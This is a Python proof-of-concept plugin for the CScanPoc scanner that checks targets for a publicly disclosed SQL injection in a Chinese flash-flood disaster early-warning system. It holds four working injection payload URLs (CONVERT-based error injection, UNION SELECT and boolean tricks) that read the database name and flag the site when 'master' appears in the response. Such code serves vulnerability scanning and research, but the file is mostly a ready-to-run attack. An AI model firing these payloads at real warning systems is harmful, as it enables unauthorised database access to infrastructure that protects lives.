# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0004'  # 平台漏洞编号，留空
    name = '四创灾害预警系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-02'  # 漏洞公布时间
    desc = '''
        福建四创软件开发的“山洪灾害预警监测系统”存在SQL注入漏洞，可获取数据库任意数据，进而而导致预警系统沦陷。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7dc7ce0c-f20c-4d29-81f4-df3b27ceaab7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-085076，http://www.wooyun.org/bugs/wooyun-2010-086828，http://www.wooyun.org/bugs/wooyun-2010-086831，http://www.wooyun.org/bugs/wooyun-2010-086833，http://www.wooyun.org/bugs/wooyun-2010-086834，
            hh = hackhttp.hackhttp()
            payloads = [
                "/Response/AjaxHandle/AjaxSingleGetReferenceFieldValue.ashx?strFieldValue=1&strSelectFieldCollection=1&tableName=sysobjects&strFieldName=convert(int,db_name(1))",
                "/Report/AjaxHandle/StationChoose/StationSearch.ashx?stationName=')+and+1=2++union+all+select+(db_name(1)),NULL--&stationType='KKK'&sqlW",
                "/warn/OuterWarnModEdit.aspx?ModID=1+AND+5726=CONVERT(INT,(select+top+1+db_name(1)+from+strongmain.dbo.Web_SystemUser))",
                "/Duty/MailList/ContactUpdate.aspx?ReadOnly=&UnitID=1&ContactID=-1+and+1=db_name(1)"
            ]
            for payload in payloads:
                vul_url = self.target + payload
                code, head, res, _, _ = hh.http(vul_url)
                if code == 200 and 'master' in res:
                    # security_hole(vul_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
